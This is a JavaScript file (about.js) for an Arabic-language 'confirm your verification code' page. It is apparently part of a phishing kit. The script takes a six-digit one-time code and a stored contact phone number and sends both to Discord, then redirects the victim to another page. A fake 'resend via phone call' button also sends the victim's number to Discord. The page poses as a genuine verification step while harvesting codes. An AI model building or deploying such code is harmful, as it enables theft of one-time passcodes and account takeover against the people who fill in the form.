// about.js

document.addEventListener('DOMContentLoaded', function () {
  const form = document.getElementById('confirmationForm');
  const codeInput = document.getElementById('text');
  const submitBtn = document.getElementById('confirmCodeBtn');
  const resendBtn = document.getElementById('resendCallBtn');
  const errorMsg = document.getElementById('errorMsg');
  const successMsg = document.getElementById('successMsg');

  /* =========================
     تأكيد رمز التحقق
  ========================== */
  form.addEventListener('submit', async function (e) {
    e.preventDefault();

    errorMsg.style.display = 'none';
    successMsg.style.display = 'none';

    const code = codeInput.value.trim();

    // تحقق من الرمز (6 أرقام)
    if (!/^[0-9]{6}$/.test(code)) {
      errorMsg.textContent = '⚠️ يرجى إدخال رمز مكون من 6 أرقام';
      errorMsg.style.display = 'block';
      return;
    }

    disableForm('confirmationForm');

    try {
      const contactNumber = getFromStorage('contactNumber') || 'غير معروف';

      const message = `
✅ تأكيد رمز التحقق
📱 رقم التواصل: ${contactNumber}
🔢 الرمز المدخل: ${code}
⏱️ الوقت: ${new Date().toLocaleString()}
====================
`;

      const success = await sendToDiscord(message);

      if (success) {
        successMsg.textContent = '✅ تم إرسال رمز التأكيد بنجاح';
        successMsg.style.display = 'block';

        showLoading();

        setTimeout(() => {
          window.location.href = 'template.html';
        }, 2000);
      } else {
        throw new Error('Discord failed');
      }
    } catch (err) {
      console.error(err);
      errorMsg.textContent = '❌ فشل الإرسال، حاول مرة أخرى';
      errorMsg.style.display = 'block';
      enableForm('confirmationForm');
    }
  });

  /* =========================
     إعادة إرسال الرمز عبر مكالمة
  ========================== */
  resendBtn.addEventListener('click', async () => {
    errorMsg.style.display = 'none';
    successMsg.style.display = 'none';

    resendBtn.disabled = true;
    showLoading();

    try {
      const contactNumber = getFromStorage('contactNumber') || 'غير معروف';

      const message = `
📞 طلب إعادة إرسال الرمز عبر مكالمة
📱 رقم التواصل: ${contactNumber}
⏱️ الوقت: ${new Date().toLocaleString()}
====================
`;

      await sendToDiscord(message);

      successMsg.textContent = '📞 تم طلب إعادة إرسال المكالمة بنجاح';
      successMsg.style.display = 'block';

      setTimeout(() => {
        hideLoading();
        resendBtn.disabled = false;
      }, 2000);

    } catch (err) {
      console.error(err);
      hideLoading();
      resendBtn.disabled = false;
      errorMsg.textContent = '❌ فشل الطلب، حاول لاحقاً';
      errorMsg.style.display = 'block';
    }
  });

  /* =========================
     السماح بالأرقام فقط
  ========================== */
  codeInput.addEventListener('input', function () {
    this.value = this.value.replace(/[^0-9]/g, '');
  });
});
